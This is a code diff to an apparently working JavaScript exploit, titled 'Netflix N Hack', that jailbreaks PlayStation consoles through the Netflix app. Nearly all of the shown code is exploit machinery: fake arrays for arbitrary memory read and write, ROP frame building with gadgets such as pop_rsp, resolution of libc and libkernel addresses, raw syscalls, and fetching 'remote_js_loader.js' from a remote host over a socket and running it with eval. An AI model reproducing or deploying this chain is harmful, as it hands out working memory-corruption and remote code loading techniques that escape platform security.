@@ -67,7 +67,6 @@ let SYSCALL = {
     munmap: 0x49n,
     fsync: 0x5fn,
     ioctl: 0x36n,
-    nmount: 0x17An,
 
     thr_new: 0x1c7n,
     thr_exit: 0x1afn,
@@ -198,13 +197,154 @@ const ws = {
 // #endregion
 // #region Logger
 const logger = {
-    ts_start: null,
-    log(msg)         { ws.send((((Date.now() - this.ts_start) / 1000) | 0) + ' ' + msg); },
-    init()           {
-        this.ts_start = Date.now();
+    overlay: null,
+    lines: [],
+    widgets: [],
+    maxLines: 40,
+    refreshTimer: null,
+    pendingRefresh: false,
+    widgetEnabled: true,
+    init() {
+        this.overlay = nrdp.gibbon.makeWidget();
+        this.overlay.color = { r: 0, g: 0, b: 0, a: 255 };
+        this.overlay.width = 1280;
+        this.overlay.height = 720;
+
+        nrdp.gibbon.scene.widget = this.overlay;
+
+        // Title widget - large red "Netflix N Hack" (centered)
+        var title = nrdp.gibbon.makeWidget({
+            name: "title",
+            x: 380,
+            y: 300,
+            width: 500,
+            height: 100
+        });
+        title.text = {
+            contents: "Netflix N Hack",
+            size: 72,
+            color: { a: 255, r: 255, g: 0, b: 0 },
+            wrap: false
+        };
+        title.parent = this.overlay;
+
+        // Subtitle widget - shown for PS4 (centered below title)
+        this.subtitle = nrdp.gibbon.makeWidget({
+            name: "subtitle",
+            x: 400,
+            y: 420,
+            width: 500,
+            height: 30
+        });
+        this.subtitle.text = {
+            contents: "",
+            size: 22,
+            color: { a: 255, r: 255, g: 100, b: 100 },
+            wrap: false
+        };
+        this.subtitle.parent = this.overlay;
+
+        // Pre-create all text widgets once to avoid removal/recreation overhead
+        for (var i = 0; i < this.maxLines; i++) {
+            var w = nrdp.gibbon.makeWidget({
+                name: "ln" + i,
+                x: 10,
+                y: 10 + (i * 17),
+                width: 1260,
+                height: 15
+            });
+
+            w.text = {
+                contents: "",
+                size: 12,
+                color: {
+                    a: 255,
+                    r: 0,
+                    g: 255,
+                    b: 0
+                },
+                wrap: false
+            };
+
+            w.parent = this.overlay;
+            this.widgets.push(w);
+        }
     },
-    flush()          {},
-    setSubtitle(text) {}
+    log(msg) {
+        ws.send(msg);
+
+        if (!this.widgetEnabled) return;
+
+        this.lines.push(msg);
+        if (this.lines.length > this.maxLines) this.lines.shift();
+
+        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
+        this.refreshTimer = nrdp.setTimeout(() => {
+            this.refresh();
+            this.refreshTimer = null;
+        }, 200);
+
+        this.pendingRefresh = true;
+    },
+    refresh() {
+        if (!this.widgetEnabled || !this.overlay) return;
+
+        // Update widget text content without recreating widgets
+        for (var i = 0; i < this.maxLines; i++) {
+            if (i < this.lines.length) {
+                this.widgets[i].text = {
+                    contents: this.lines[i],
+                    size: 12,
+                    color: {
+                        a: 255,
+                        r: 0,
+                        g: 255,
+                        b: 0
+                    },
+                    wrap: false
+                };
+            } else {
+                // Clear unused widget slots
+                this.widgets[i].text = {
+                    contents: "",
+                    size: 12,
+                    color: {
+                        a: 255,
+                        r: 0,
+                        g: 255,
+                        b: 0
+                    },
+                    wrap: false
+                };
+            }
+        }
+
+        this.pendingRefresh = false;
+    },
+    flush() {
+        if (!this.widgetEnabled) return;
+        // Force immediate refresh if needed (call before blocking operations)
+        if (this.refreshTimer) {
+            nrdp.clearTimeout(this.refreshTimer);
+            this.refreshTimer = null;
+        }
+        if (this.pendingRefresh) {
+            this.refresh();
+        }
+    },
+    setSubtitle(text) {
+        if (this.subtitle) {
+            this.subtitle.text = {
+                contents: text,
+                size: 20,
+                color: { a: 255, r: 255, g: 100, b: 100 },
+                wrap: false
+            };
+        }
+    },
+    disableWidget() {
+        this.widgetEnabled = false;
+    }
 };
 // #endregion
 // #region Pointer Helpers
@@ -384,10 +524,14 @@ class gadgets {
                         logger.flush();
                     }
                 });
+                logger.setSubtitle("PS4 Detected, Loading Exploit...");
                 is_ps4 = true;
                 return; // Exit constructor, main() will check is_ps4 and return
             default:
+
                 throw new Error("App version not supported");
+
+
         }
     }
     get(gadget) {
@@ -1017,18 +1161,7 @@ function main () {
             fake_rw[85] = original_value;
         }
 
-        let _raw8_saved = 0n;
-        function raw8_start(addr) {
-            _raw8_saved = fake_rw[85];
-            fake_rw[85] = addr;
-        }
-        function raw8_end() {
-            fake_rw[85] = _raw8_saved;
-        }
-        function raw8_at(j)      { return fake_victim_8[j]; }
-        function raw8_put(j, v)  { fake_victim_8[j] = v; }
-
-        function xcopy_uncompressed (add_src, add_dst, len, verbose=false) {
+        function copy_uncompressed (add_src, add_dst, len, verbose=false) {
             let orig_8 = fake_rw[85];
 
             const CHUNK = 4096;
@@ -1137,22 +1270,7 @@ function main () {
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
 
-        let ROP = {
-            get pop_rsp()             { return g.get('pop_rsp');               },
-            get pop_rax()             { return g.get('pop_rax');               },
-            get pop_rdi()             { return g.get('pop_rdi');               },
-            get pop_rsi()             { return g.get('pop_rsi');               },
-            get pop_rdx()             { return g.get('pop_rdx');               },
-            get pop_rcx()             { return g.get('pop_rcx');               },
-            get pop_r8()              { return g.get('pop_r8');                },
-            get ret()                 { return g.get('ret');                   },
-            get mov_qword_rdi_rax()   { return g.get('mov_qword_ptr_rdi_rax'); },
-        };
-
         // Pre-computed constants and cache state for call_rop.
-        // Declared HERE (before call_rop) so the closure captures already-initialized
-        // bindings. Declaring let/const after a function declaration in the same block
-        // leaves them in the TDZ for the function-hoisted binding, causing ReferenceError.
         const _cr_stack_offset    = 0x700000001n;
         const _cr_rop_return_addr = base_heap_add + fake_rop_return;
         const _cr_fake_frame_lo   = fake_frame & 0xffffffffn;
@@ -1246,14 +1364,9 @@ function main () {
         logger.log("syscall_wrapper : " + hex(syscall_wrapper));
         const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);
 
-        // Thread for elfldr
+        // Thread for elfldr; calling Thrd_create crashes on FW 10.x and possibly higher versions
         let Thrd_create = libc_base + 0x4c30n;
         let Thrd_join = libc_base + 0x4a30n;
-
-        // used in ytjb:
-        // Thrd_create = libc_base + 0x4BF0n;
-        // Thrd_join = libc_base + 0x49F0n;
-
 
         // Used for gpu rw
         const sceKernelAllocateMainDirectMemory = read64_uncompressed(eboot_base + 0x241f6a8n);
@@ -1309,21 +1422,6 @@ function main () {
         libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
         logger.log("libkernel_base @ " + hex(libkernel_base));
         logger.flush();
-
-        /***** LibC load base *****/
-        ret = call(sceKernelGetModuleInfoFromAddr, libc_strerror, 0x1n, mod_info);
-        if (ret !== 0x0n) throw new Error("sceKernelGetModuleInfoFromAddr(libc) failed: " + hex(ret));
-        const libc_load_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
-        logger.log("libc_load_base @ " + hex(libc_load_base));
-        if (libc_base != libc_load_base) {
-            throw new Error("Invalid libc_base=" + hex());
-        }
-
-        /***** test libc call *****/
-        const test = call(libc_strerror, 12n);
-        logger.log("TEST: strerror(12) = " + read_cstring(test));
-
-        const scePthreadCreate = libkernel_base + 0x73d0n;
 
         function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n)
         {
@@ -1453,42 +1551,42 @@ function main () {
                         prefetch_scratch + BigInt(carry), BigInt(256 - carry)));
                     if (bytes_read <= 0)
                         throw new Error("Connection closed before HTTP header was found.");
-                    const available = carry + bytes_read;
+                    const bytes_available = carry + bytes_read;
 
                     let orig_8 = fake_rw[85];
                     fake_rw[85] = prefetch_scratch;
-                    let found_at = -1;
-                    const scan_limit = available - 3;
+                    let header_end_idx = -1;
+                    const scan_limit = bytes_available - 3;
                     for (let j = 0; j < scan_limit; j++) {
                         if (fake_victim_8[j]     === 0x0D &&
                             fake_victim_8[j + 1] === 0x0A &&
                             fake_victim_8[j + 2] === 0x0D &&
                             fake_victim_8[j + 3] === 0x0A) {
-                            found_at = j;
+                            header_end_idx = j;
                             break;
                         }
                     }
                     fake_rw[85] = orig_8;
 
-                    if (found_at >= 0) {
-                        const body_start = found_at + 4;
-                        const prefix_len = available - body_start;
+                    if (header_end_idx >= 0) {
+                        const body_start = header_end_idx + 4;
+                        const prefix_len = bytes_available - body_start;
                         if (prefix_len > 0) {
-                            xcopy_uncompressed(prefetch_scratch + BigInt(body_start),
+                            copy_uncompressed(prefetch_scratch + BigInt(body_start),
                                 buffer_return, prefix_len);
                         }
                         total_received = prefix_len;
                         break;
                     }
 
-                    header_bytes += available;
+                    header_bytes += bytes_available;
                     if (header_bytes > 16384)
                         throw new Error("Could not find HTTP header; response too large");
 
-                    if (available >= 3) {
+                    if (bytes_available >= 3) {
                         orig_8 = fake_rw[85];
                         fake_rw[85] = prefetch_scratch;
-                        const s = available - 3;
+                        const s = bytes_available - 3;
                         const b0 = fake_victim_8[s];
                         const b1 = fake_victim_8[s + 1];
                         const b2 = fake_victim_8[s + 2];
@@ -1498,14 +1596,14 @@ function main () {
                         fake_rw[85] = orig_8;
                         carry = 3;
                     } else {
-                        carry = available;
+                        carry = bytes_available;
                     }
                 }
 
                 // Loop over the rest of the data
                 while (total_received < buffer_size) {
-                    const remaining = BigInt(buffer_size - total_received);
-                    const chunk = remaining < 65536n ? remaining : 65536n;
+                    const bytes_remaining = BigInt(buffer_size - total_received);
+                    const chunk = bytes_remaining < 65536n ? bytes_remaining : 65536n;
                     const n = syscall(SYSCALL.read, sock, buffer_return + BigInt(total_received), chunk);
                     if (n === 0xffffffffffffffffn || n === 0n) break;
                     total_received += Number(n);
@@ -1660,18 +1758,10 @@ function main () {
             logger.log("Unsupported FW_VERSION: " + FW_VERSION);
             send_notification("Unsupported FW_VERSION: " + FW_VERSION);
         } else if (compare_version(FW_VERSION, "10.01") > 0) {
-            const script_name = "remote_js_loader.js";
+            logger.disableWidget();
+            var script_name = "remote_js_loader.js";
             logger.log("loading " + script_name);
-
             let script = get_script(script_name);
-
-            const logger_log_orig = logger.log.bind(logger);
-            logger.log = function(msg) {
-                logger_log_orig(msg);
-                if (!_cr_caching_active) {
-                    nanosleep_ms(5);
-                }
-            };
 
             if (script.trim().startsWith("<")) {
                 let errorMsg = "get_script returned HTML instead of JS (likely a 404 error). First 50 chars: " + script.substring(0, 50);
@@ -1679,7 +1769,6 @@ function main () {
                 logger.flush();
                 return;
             }
-
             eval(script);
             logger.flush();
         } else {
@@ -1694,9 +1783,8 @@ function main () {
         }
 
         if (!is_jailbroken()) {
-            logger.log("Jailbreak didn't succeed. Reboot and Try again!");
             send_notification("Jailbreak didn't succeed. Reboot and Try again!");
-            // throw new Error("Jailbreak didn't succeed");
+            throw new Error("Jailbreak didn't succeed");
         }
 
 
@@ -1706,6 +1794,5 @@ function main () {
         logger.flush();
     }
 }
-
 
 ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});
